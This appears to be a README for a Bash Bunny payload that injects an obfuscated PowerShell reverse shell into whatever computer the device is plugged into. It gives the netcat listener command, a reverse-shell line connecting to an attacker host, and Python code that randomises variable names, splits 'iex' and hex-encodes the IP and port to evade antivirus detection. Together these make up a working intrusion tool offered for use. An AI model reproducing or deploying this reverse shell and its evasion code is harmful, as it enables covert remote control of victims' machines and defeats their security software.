
# PolyWog-Shell 
### By: Hak5Peaks


## PolyWog Shell Description. 

Poly shell is a reverse shell generator designed for the Bash Bunny. This payload uses a python2 + bash script to generate a signature unique powershell payload, that evades signature based detection anti viruses. Every time the bash bunny is plugged into a computer, a unique powershell script will be injected into the target machine. 

The python2 script uses a base powershell payload and randomizes/obfuscates parts of the powershell payload. Using methods such as variable and string Obfuscation and IP and Port Encoding

## LED. 

- Blue, payload has started and is running.
- Red, Payload failed, most likely due to missing `shell.py`
- Green, payload has completed. 


## Configuations. 

This script requires minimal configuration. simply launch a nc listener `nc -lvnp PORT` and copy the IP and Port from your listener into the IP and Port variable on the payload. Then place the python2 script `shell.py` inside of the `tools` directory of the udisk.
 

### Shell + Payload configuation Example
<div style="display: flex; justify-content: center; gap: 10px;">
    <img src="https://github.com/user-attachments/assets/874226a5-6d3e-47d4-93bd-70fbf0ef5d2a" width="45%">
    <img src="https://github.com/user-attachments/assets/7f656678-575e-43b3-8988-a60a70b01169" width="45%">
</div>

### Udisk configuration Example

![image](https://github.com/user-attachments/assets/daf4b620-5d38-4ceb-86b0-95edafd0494d)


## Requirements. 

Ensure correct configuation as stated above. There is `no` other requirments or external packages that need to be install. 




# For anyone interest in the code! ↓




## Code break down - Base powershell script. 

![image](https://github.com/user-attachments/assets/4fb614fe-7593-4b43-ac6c-46bcecf88b3d)


This is the base powershell script that is plugged into the python2 script. It is a simple reverse shell that uses `System.Net.Sockets.TCPClient` to make remote connections to our netcat listener. This connection is TCP connection is kept open and the script waits for a response back from the netcat server and runs the results in shell  using `Invoke-Expression` Once a command is received and ran the output of the command is sent back using `StreamWriter` to the remote IP and Port specified in the powershell payload. Very simple :D 



## Code break down - Python obfuscator script. 

![image](https://github.com/user-attachments/assets/a4c96bab-5d59-43c3-b1d8-099a7b43eb1a)

This is the python script that stores our original powershell payload. The python script's job is to use regexing to modify, randomize and replace parts of our original powershell payload in order to create a brand new payload that achieves the same functionality as the original. 

It does it using these functions, 

First, when the script is called it takes in our command line arguments from the bash script and stores them as variables within the script 
```
ip = sys.argv[1]
port = sys.argv[2]
```
Second, the script replaces our IP and Port within out powershell payload, 
```
script = """$tcp=New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);...
```
Third, the python script looks for variables names within our powershell payload and replaces them with random letters 
```
var_dict = {}
pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z][A-Za-z0-9]+)')
def replace_var(match):
    var_name = match.group(1)
    if var_name not in var_dict:
        var_dict[var_name] = '$' + ''.join(random.sample(string.ascii_letters + string.digits, 10))
    return var_dict[var_name]

script = pattern.sub(replace_var, script)
```
Resulting in a output similar to this `$tcp -> $aBc123dEf4` 
 
Then, the python script will search for certain commands such as `iex` that can be easily changed. without creating conflicts. `iex -> i''ex`
```
pattern = re.compile(r'\biex\b')
script = pattern.sub("i''ex", script)
```
The script then moves on to convert our IP and port numbers to hex. 

```
pattern = re.compile(r'\b(?!65535)([1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])\b')
def port_to_hex(match):
    port_number = int(match.group())
    return hex(port_number)

script = pattern.sub(port_to_hex, script)
```
The brand new powershell payload is stored as shell.txt so its contents can later be used inside out bash bunny payload. 



